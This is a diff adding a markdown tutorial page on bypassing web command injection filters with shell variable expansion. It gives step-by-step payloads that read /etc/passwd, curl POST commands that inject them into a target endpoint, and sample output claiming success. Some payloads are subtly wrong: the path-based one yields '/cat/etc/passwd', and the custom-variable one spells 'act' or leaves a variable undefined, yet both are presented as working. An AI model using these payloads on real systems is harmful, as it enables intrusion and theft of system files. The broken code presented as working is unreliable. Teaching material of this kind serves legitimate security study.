@@ -1,0 +1,88 @@
+---
+title: Bypass Web Filters with Shell Variable Expansion
+description: Learn to bypass command injection filters using shell variable expansion
+  in web applications.
+keywords:
+- shell variable expansion
+- command injection
+- filter bypass
+- dynamic file paths
+- security exploitation
+---
+
+# Bypass With Variable Expansion
+
+## Context
+
+The objective of this article is to demonstrate how shell variable expansion can be used to bypass command injection filters in web applications. This technique assumes knowledge of shell variable expansion, command line interpretation, and foundational understanding of command injection vulnerabilities.
+
+## Theory
+
+### Variable Expansion in Shells
+
+Variable expansion in shells is a process where variables are replaced with their respective values during the parsing of shell commands. This mechanism allows for dynamic command construction and execution based on variable values at runtime. Attackers can leverage this feature to reconstruct filtered or blocked characters within injected commands.
+
+### Filter Bypass via Variable Expansion
+
+Web application filters often block specific dangerous substrings to prevent command injection. However, they may not account adequately for shell variable expansion. Attackers can exploit this oversight by injecting payloads using variable expansion syntax to recreate prohibited command elements dynamically during runtime execution.
+
+### Dynamic Shell Path Construction
+
+Variable expansion facilitates the dynamic creation of file paths or command arguments. This is particularly useful for bypassing static filters that expect fixed patterns. Through variable expansion, user input is processed by the server-side script, which then executes the shell command after reconstructing the full command with expanded variables, effectively bypassing the filter.
+
+## Practice
+
+### Bypassing Filters Using Environment Variable Expansion
+
+1. **Identify filtered characters or substrings:**
+   - Understand which characters or syntax elements are filtered by the web application (e.g., 'cat', '/', or 'etc').
+
+2. **Construct a payload using variable expansion:**
+   ```bash
+   ${PATH:0:1}cat${PATH:0:1}/etc/passwd
+   ```
+   - This payload uses variable expansion to dynamically insert the '/' character, which may be filtered if used directly.
+
+3. **Inject the payload into the vulnerable parameter:**
+   ```bash
+   curl -X POST -d 'input=${PATH:0:1}cat${PATH:0:1}/etc/passwd' http://target/vuln
+   ```
+   - Send the payload in a POST request to the vulnerable endpoint.
+
+4. **Observe command execution:**
+   ```text
+   root:x:0:0:root:/root:/bin/bash
+   ...
+   ```
+   - Successful output indicates that the filter was bypassed, and the shell command was executed.
+
+### Bypassing Filters Using Custom Variable Substitution
+
+1. **Set a custom variable to reconstruct blocked substrings:**
+   - If 'cat' is blocked, you can construct it using variable expansion with interim variables.
+
+2. **Create a payload using variable substitution:**
+   ```bash
+   C=a;T=t;${C}${A}${T} /etc/passwd
+   ```
+   - This strategy reconstructs 'cat' incrementally by using intermediate variables if its direct usage is blocked.
+
+3. **Inject the payload to trigger variable expansion:**
+   ```bash
+   curl -X POST -d 'input=C=a;A=c;T=t;${C}${A}${T} /etc/passwd' http://target/vuln
+   ```
+   - Submit the crafted payload to the affected parameter.
+
+4. **Verify command execution:**
+   ```text
+   root:x:0:0:root:/root:/bin/bash
+   ...
+   ```
+   - The presence of output confirms that the filtered keywords were reconstructed using variable expansion, permitting command execution.
+
+## Tools
+
+- **curl**
+- **Burp Suite** 
+
+These tools facilitate the creation and submission of crafted payloads to web applications to exploit command injection vulnerabilities.
